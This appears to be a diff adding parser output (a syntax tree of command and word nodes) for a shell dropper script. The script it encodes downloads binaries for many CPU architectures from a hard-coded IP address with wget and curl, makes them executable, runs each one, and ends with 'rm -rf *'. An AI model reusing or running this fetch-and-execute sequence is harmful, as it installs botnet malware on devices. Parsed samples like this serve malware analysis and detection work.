@@ -1,0 +1,174 @@
+CommandNode(lineno=3, pos=(13, 20), parts=[
+  WordNode(lineno=3, pos=(13, 15), word='cd'),
+  WordNode(lineno=3, pos=(16, 20), word='/tmp'),
+])
+CommandNode(lineno=4, pos=(21, 57), parts=[
+  WordNode(lineno=4, pos=(21, 25), word='wget'),
+  WordNode(lineno=4, pos=(26, 57), word='http://185.165.29.26/prefixmips'),
+])
+CommandNode(lineno=5, pos=(58, 96), parts=[
+  WordNode(lineno=5, pos=(58, 62), word='wget'),
+  WordNode(lineno=5, pos=(63, 96), word='http://185.165.29.26/prefixmipsel'),
+])
+CommandNode(lineno=6, pos=(97, 133), parts=[
+  WordNode(lineno=6, pos=(97, 101), word='wget'),
+  WordNode(lineno=6, pos=(102, 133), word='http://185.165.29.26/prefixarm4'),
+])
+CommandNode(lineno=7, pos=(134, 170), parts=[
+  WordNode(lineno=7, pos=(134, 138), word='wget'),
+  WordNode(lineno=7, pos=(139, 170), word='http://185.165.29.26/prefixarm5'),
+])
+CommandNode(lineno=8, pos=(171, 206), parts=[
+  WordNode(lineno=8, pos=(171, 175), word='wget'),
+  WordNode(lineno=8, pos=(176, 206), word='http://185.165.29.26/prefixsh4'),
+])
+CommandNode(lineno=9, pos=(207, 242), parts=[
+  WordNode(lineno=9, pos=(207, 211), word='wget'),
+  WordNode(lineno=9, pos=(212, 242), word='http://185.165.29.26/prefixppc'),
+])
+CommandNode(lineno=10, pos=(243, 279), parts=[
+  WordNode(lineno=10, pos=(243, 247), word='wget'),
+  WordNode(lineno=10, pos=(248, 279), word='http://185.165.29.26/prefixi686'),
+])
+CommandNode(lineno=11, pos=(280, 317), parts=[
+  WordNode(lineno=11, pos=(280, 284), word='wget'),
+  WordNode(lineno=11, pos=(285, 317), word='http://185.165.29.26/prefixsparc'),
+])
+CommandNode(lineno=12, pos=(318, 354), parts=[
+  WordNode(lineno=12, pos=(318, 322), word='wget'),
+  WordNode(lineno=12, pos=(323, 354), word='http://185.165.29.26/prefixi586'),
+])
+CommandNode(lineno=13, pos=(355, 392), parts=[
+  WordNode(lineno=13, pos=(355, 359), word='wget'),
+  WordNode(lineno=13, pos=(360, 392), word='http://185.165.29.26/prefix86_64'),
+])
+CommandNode(lineno=14, pos=(393, 431), parts=[
+  WordNode(lineno=14, pos=(393, 397), word='wget'),
+  WordNode(lineno=14, pos=(398, 431), word='http://185.165.29.26/prefixarmv61'),
+])
+CommandNode(lineno=15, pos=(432, 467), parts=[
+  WordNode(lineno=15, pos=(432, 436), word='wget'),
+  WordNode(lineno=15, pos=(437, 467), word='http://185.165.29.26/prefixm68'),
+])
+CommandNode(lineno=17, pos=(469, 519), parts=[
+  WordNode(lineno=17, pos=(469, 473), word='curl'),
+  WordNode(lineno=17, pos=(474, 505), word='http://185.165.29.26/prefixi686'),
+  WordNode(lineno=17, pos=(506, 508), word='-o'),
+  WordNode(lineno=17, pos=(509, 519), word='prefixi686'),
+])
+CommandNode(lineno=18, pos=(520, 572), parts=[
+  WordNode(lineno=18, pos=(520, 524), word='curl'),
+  WordNode(lineno=18, pos=(525, 557), word='http://185.165.29.26/prefixsparc'),
+  WordNode(lineno=18, pos=(558, 560), word='-o'),
+  WordNode(lineno=18, pos=(561, 572), word='prefixsparc'),
+])
+CommandNode(lineno=19, pos=(573, 623), parts=[
+  WordNode(lineno=19, pos=(573, 577), word='curl'),
+  WordNode(lineno=19, pos=(578, 609), word='http://185.165.29.26/prefixi586'),
+  WordNode(lineno=19, pos=(610, 612), word='-o'),
+  WordNode(lineno=19, pos=(613, 623), word='prefixi586'),
+])
+CommandNode(lineno=20, pos=(624, 676), parts=[
+  WordNode(lineno=20, pos=(624, 628), word='curl'),
+  WordNode(lineno=20, pos=(629, 661), word='http://185.165.29.26/prefix86_64'),
+  WordNode(lineno=20, pos=(662, 664), word='-o'),
+  WordNode(lineno=20, pos=(665, 676), word='prefix86_64'),
+])
+CommandNode(lineno=21, pos=(677, 731), parts=[
+  WordNode(lineno=21, pos=(677, 681), word='curl'),
+  WordNode(lineno=21, pos=(682, 715), word='http://185.165.29.26/prefixarmv61'),
+  WordNode(lineno=21, pos=(716, 718), word='-o'),
+  WordNode(lineno=21, pos=(719, 731), word='prefixarmv61'),
+])
+CommandNode(lineno=22, pos=(732, 780), parts=[
+  WordNode(lineno=22, pos=(732, 736), word='curl'),
+  WordNode(lineno=22, pos=(737, 767), word='http://185.165.29.26/prefixm68'),
+  WordNode(lineno=22, pos=(768, 770), word='-o'),
+  WordNode(lineno=22, pos=(771, 780), word='prefixm68'),
+])
+CommandNode(lineno=23, pos=(781, 831), parts=[
+  WordNode(lineno=23, pos=(781, 785), word='curl'),
+  WordNode(lineno=23, pos=(786, 817), word='http://185.165.29.26/prefixmips'),
+  WordNode(lineno=23, pos=(818, 820), word='-o'),
+  WordNode(lineno=23, pos=(821, 831), word='prefixmips'),
+])
+CommandNode(lineno=24, pos=(832, 886), parts=[
+  WordNode(lineno=24, pos=(832, 836), word='curl'),
+  WordNode(lineno=24, pos=(837, 870), word='http://185.165.29.26/prefixmipsel'),
+  WordNode(lineno=24, pos=(871, 873), word='-o'),
+  WordNode(lineno=24, pos=(874, 886), word='prefixmipsel'),
+])
+CommandNode(lineno=25, pos=(887, 937), parts=[
+  WordNode(lineno=25, pos=(887, 891), word='curl'),
+  WordNode(lineno=25, pos=(892, 923), word='http://185.165.29.26/prefixarm4'),
+  WordNode(lineno=25, pos=(924, 926), word='-o'),
+  WordNode(lineno=25, pos=(927, 937), word='prefixarm4'),
+])
+CommandNode(lineno=26, pos=(938, 988), parts=[
+  WordNode(lineno=26, pos=(938, 942), word='curl'),
+  WordNode(lineno=26, pos=(943, 974), word='http://185.165.29.26/prefixarm5'),
+  WordNode(lineno=26, pos=(975, 977), word='-o'),
+  WordNode(lineno=26, pos=(978, 988), word='prefixarm5'),
+])
+CommandNode(lineno=27, pos=(989, 1037), parts=[
+  WordNode(lineno=27, pos=(989, 993), word='curl'),
+  WordNode(lineno=27, pos=(994, 1024), word='http://185.165.29.26/prefixsh4'),
+  WordNode(lineno=27, pos=(1025, 1027), word='-o'),
+  WordNode(lineno=27, pos=(1028, 1037), word='prefixsh4'),
+])
+CommandNode(lineno=28, pos=(1038, 1086), parts=[
+  WordNode(lineno=28, pos=(1038, 1042), word='curl'),
+  WordNode(lineno=28, pos=(1043, 1073), word='http://185.165.29.26/prefixppc'),
+  WordNode(lineno=28, pos=(1074, 1076), word='-o'),
+  WordNode(lineno=28, pos=(1077, 1086), word='prefixppc'),
+])
+CommandNode(lineno=31, pos=(1089, 1100), parts=[
+  WordNode(lineno=31, pos=(1089, 1094), word='chmod'),
+  WordNode(lineno=31, pos=(1095, 1098), word='777'),
+  WordNode(lineno=31, pos=(1099, 1100), word='*'),
+])
+CommandNode(lineno=33, pos=(1102, 1116), parts=[
+  WordNode(lineno=33, pos=(1102, 1116), word='./prefixarmv61'),
+])
+CommandNode(lineno=34, pos=(1117, 1130), parts=[
+  WordNode(lineno=34, pos=(1117, 1130), word='./prefixsparc'),
+])
+CommandNode(lineno=35, pos=(1131, 1142), parts=[
+  WordNode(lineno=35, pos=(1131, 1142), word='./prefixm68'),
+])
+CommandNode(lineno=36, pos=(1143, 1155), parts=[
+  WordNode(lineno=36, pos=(1143, 1155), word='./prefixmips'),
+])
+CommandNode(lineno=37, pos=(1156, 1170), parts=[
+  WordNode(lineno=37, pos=(1156, 1170), word='./prefixmipsel'),
+])
+CommandNode(lineno=38, pos=(1171, 1183), parts=[
+  WordNode(lineno=38, pos=(1171, 1183), word='./prefixarm4'),
+])
+CommandNode(lineno=39, pos=(1184, 1196), parts=[
+  WordNode(lineno=39, pos=(1184, 1196), word='./prefixarm5'),
+])
+CommandNode(lineno=40, pos=(1197, 1208), parts=[
+  WordNode(lineno=40, pos=(1197, 1208), word='./prefixsh4'),
+])
+CommandNode(lineno=41, pos=(1209, 1220), parts=[
+  WordNode(lineno=41, pos=(1209, 1220), word='./prefixppc'),
+])
+CommandNode(lineno=42, pos=(1221, 1233), parts=[
+  WordNode(lineno=42, pos=(1221, 1233), word='./prefixi686'),
+])
+CommandNode(lineno=43, pos=(1234, 1246), parts=[
+  WordNode(lineno=43, pos=(1234, 1246), word='./prefixi586'),
+])
+CommandNode(lineno=44, pos=(1247, 1260), parts=[
+  WordNode(lineno=44, pos=(1247, 1260), word='./prefix86_64'),
+])
+CommandNode(lineno=45, pos=(1261, 1268), parts=[
+  WordNode(lineno=45, pos=(1261, 1266), word='sleep'),
+  WordNode(discard=True, lineno=45, pos=(1267, 1268), word='3'),
+])
+CommandNode(lineno=46, pos=(1270, 1278), parts=[
+  WordNode(lineno=46, pos=(1270, 1272), word='rm'),
+  WordNode(lineno=46, pos=(1273, 1276), word='-rf'),
+  WordNode(lineno=46, pos=(1277, 1278), word='*'),
+])
